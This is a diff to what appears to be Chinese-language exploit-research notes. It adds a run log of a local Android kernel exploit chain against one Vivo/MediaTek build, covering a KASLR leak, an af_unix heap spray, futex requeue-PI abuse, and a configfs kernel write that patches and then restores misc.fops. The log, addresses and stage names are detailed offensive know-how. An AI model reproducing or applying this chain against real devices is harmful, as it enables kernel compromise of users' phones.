@@ -39,6 +39,45 @@
 
 目标互锁必须独立测试。设备观测元组为 PD2314/V2314A、`k6895v1_64`、`mt6895`、`arm64-v8a`、显示版本 `PD2314_A_15.2.18.0.W10`、内核 release `5.10.233-android12-9-g44ec642832da-dirty`；而产物打印的 profile 标签指向 `15.2.17.1`，所以这次正向运行不能证明精确版本拒绝。应在主动探测之前执行 fail-closed 检查，并设置负向判据：机型、board、platform、显示版本、fingerprint、内核 release、ABI 任一不符或属性不可读，都必须立即退出。
 
+### 运行日志
+
+```
+[*] kernelsnitch collision-scan found=7/7 elapsed_ms=1595
+[*] kernelsnitch collision-scan leaked mm=ffffff816a8c6cc0
+[*] timing stage=page-mm-layout pid=8189 elapsed_ms=3817
+[*] tcp payload geometry slab_base=ffffff816a8c0000 payload_base=ffffff816a8c0000 payload_bias=0xe80 fake_lock=ffffff816a8c1350 fake_w0=ffffff816a8c2220 fake_task=ffffff816a8c5800 fake_fops=ffffff816a8c1000 wait_lock=ffffff816a8c1370 owner=ffffff816a8c5801
+[*] final lock mode=active-final base=ffffff816a8c1350 lock=ffffff816a8c1370 root=ffffff816a8c2220 leftmost=ffffff816a8c2220 owner=ffffff816a8c5801 fake_w0_prio=255 pi_parent=ffffff816a8c0ff8 pi_top=ffffffeb188ec200
+[*] tcp fops pi geometry parent=ffffff816a8c0ff8 right=0000000000000000 left=0000000000000000 final_pi_write=1 waiter_lock=ffffff816a8c1370
+[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff816a8c1000
+[*] timing stage=page-leak-payload pid=8189 elapsed_ms=3818
+[*] af_unix order3 staged pairs=64 requested=64
+[*] timing stage=page-spray-stage pid=8189 elapsed_ms=3819
+[*] sk_buff pcp send ret=65536 errno=0
+[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
+[*] timing stage=page-reclaim-send pid=8189 elapsed_ms=3973
+[-] kpage state unavailable flags_fd=-1 count_fd=-1 errno=13
+[*] timing stage=page-cleanup pid=8189 elapsed_ms=5038
+[*] timing stage=page-total pid=8189 elapsed_ms=5039
+[*] timing stage=fops-page pid=8189 elapsed_ms=5039
+[+] refclone fops page ready base=ffffff816a8c0000
+[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
+[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x888 marker_off=0x58 target=x28+0x38 value=ffffff816a8c1370 final_fops=1 full_waiter=0 overlay=marker
+[*] slide final tree parent=ffffff8002c84ea0 right=ffffff816a8c1000 left=0 pi_write=1
+[*] slide ip overlay qwords 20=ffffff8002c84ea0 28=ffffff816a8c1000 30=0 38=ffffff816a8c0ff8 40=0 48=0 50=ffffffeb188ec200 58=ffffff816a8c1370 60=00000000000000ff
+[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
+[*] slide ip side effect calls=1 sched_ok=1
+[*] main route chain released ret=0 errno=0 owner=0/0 safe=1
+[*] main waiter pi scrub ret=-1 errno=110 ok=1
+[*] configfs write window target=ffffffeb18a84ea8 base=ffffffeb18000000 pos=0xa884ea8 len=8 ret=8 errno=0
+[*] misc.fops restore target=ffffffeb18a84ea8 original=ffffffeb1838fbd8 ret=8 errno=0
+[+] misc.fops restored to ashmem_fops — ashmem safe
+[+] route-summary pid=8189 kaslr=1 base=ffffffeb15e00000 slide=0000002b0de00000 route_done=1
+uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(addb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012(readtracefs) context=u:r:shell:s0
+```
+
+
+复位步骤通过 configfs 写窗口将原始 `ashmem_fops` 地址写回 `misc.fops` 槽（`ret=8` = 写入 8 字节，`errno=0` = 成功）。此后设备未崩溃、未重启，ashmem 访问安全。这是对本构建复位逻辑的正向安全判据；在未独立验证 `ashmem_fops` 偏移和 configfs 写窗口可用性的情况下，不推广至其他构建。
+
 ## 抗故障日志
 
 工程实验建议使用两个互相独立的通道：
